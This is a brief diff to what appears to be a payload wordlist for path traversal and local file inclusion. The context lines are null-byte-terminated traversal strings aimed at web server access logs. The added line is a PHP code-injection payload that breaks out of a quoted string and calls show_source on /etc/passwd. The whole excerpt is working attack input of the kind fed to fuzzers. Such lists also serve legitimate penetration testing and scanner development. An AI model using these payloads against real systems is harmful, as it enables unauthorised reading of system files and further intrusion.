@@ -566,4 +566,4 @@ C:/wamp/logs/access.log
 ../../../../../../../../../../../../../../../var/log/httpd-access.log%00
 ../../../../../../../../../../../../../../../../var/log/httpd-access.log%00
 ../../../../../../../../../../../../../../../../../var/log/httpd-access.log%00
-     
+' and die(show_source('/etc/passwd')) or '
